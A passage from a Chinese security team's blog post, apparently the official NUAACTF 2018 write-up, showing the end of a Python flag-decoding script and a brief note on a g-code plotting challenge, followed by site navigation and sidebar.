class="string">'86la1l52l9fl93l9dl97l52l9bla6l52l9fla1la4l97l52l96l9bl98l98l9bl95la7l9ela6l52la6la1l52l95l93l9el95la7l9el93la6l97l52la6l9al97l52l98l9el93l99l52l94labl52l9al93la0l96l5el52la0la7l93l93l95la6l98ladla2labl91la7la0l95la1l9fla2labl9el97lafl5el52l98l9el93l99l52l9bla5l52l98la1la4l52la5l95la4l9bla2la6la5l'</span></div><div class="line">    enc_flag = enc_flag[:<span class="number">-1</span>].split(<span class="string">'l'</span>)</div><div class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> enc_flag:</div><div class="line">        print(chr(int(each, <span class="number">16</span>)<span class="number">-0x32</span>), end=<span class="string">''</span>)</div><div class="line">    print()</div><div class="line">enc()</div><div class="line">dec()</div></pre></td></tr></table></figure>
<p>得到flag</p>
<h3 id="plot"><a href="#plot" class="headerlink" title="plot"></a>plot</h3><p>g-code plot</p>
<p><a href="https://ncviewer.com/" target="_blank" rel="external">https://ncviewer.com/</a></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://asuri.org/2018/12/25/NUAACTF-2018-官方wp/" data-id="ckhkqui2i000o4solci4iop0k" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/nuaactf/">nuaactf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/">writeup</a></li></ul>

    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2019/01/17/命令执行/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          巧用命令注入的N种方式
        
      </div>
    </a>
  
  
    <a href="/2018/08/25/run-multi-service-in-one-container/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">如何科学的在Docker Container中运行多个服务</div>
    </a>
  
</nav>

  
</article>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Categories</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/">Develop</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Devops/">Devops</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/">Pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Reverse/">Reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web-安全/">Web 安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Writeup/">Writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/安卓安全/">安卓安全</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2015-3864/">CVE-2015-3864</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rev/">Rev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/analytics/">analytics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/googlectf/">googlectf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jctf/">jctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mirai/">mirai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nuaactf/">nuaactf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phantom/">phantom</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qzone/">qzone</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/suctf/">suctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virus/">virus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件格式漏洞/">文件格式漏洞</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CVE-2015-3864/" style="font-size: 10px;">CVE-2015-3864</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Pwn/" style="font-size: 15px;">Pwn</a> <a href="/tags/RCE/" style="font-size: 15px;">RCE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Rev/" style="font-size: 10px;">Rev</a> <a href="/tags/Tools/" style="font-size: 15px;">Tools</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/analytics/" style="font-size: 10px;">analytics</a> <a href="/tags/googlectf/" style="font-size: 15px;">googlectf</a> <a href="/tags/jctf/" style="font-size: 10px;">jctf</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/mirai/" style="font-size: 10px;">mirai</a> <a href="/tags/nuaactf/" style="font-size: 15px;">nuaactf</a> <a href="/tags/phantom/" style="font-size: 10px;">phantom</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/qzone/" style="font-size: 10px;">qzone</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/suctf/" style="font-size: 10px;">suctf</a> <a href="/tags/virus/" style="font-size: 10px;">virus</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/xss/" style="font-size: 15px;">xss</a> <a href="/tags/文件格式漏洞/" style="font-size: 10px;">文件格式漏洞</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2019/07/30/2019-googlectf-writeup-part2/">2019-googlectf-writeup-part2</a>
          </li>
        
          <li>
            <a href="/2019/07/30/2019-googlectf-writeup-part1/">2019-googlectf-writeup-part1</a>
          </li>
        
          <li>
            <a href="/2019/04/22/Asuri_2019/">2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp</a>
          </li>
        
          <li>
            <a href="/2019/04/11/PHP复杂变量/">从一道题讲PHP复杂变量</a>
          </li>
        
          <li>
            <a href="/2019/03/12/命令执行到提权/">命令执行到提权</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 All Members<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
  <script src="/fancybox/jquery.fancybox.pack.js"></script>


<script src="/js/script.js"></script>

  </div>
</body>
</html>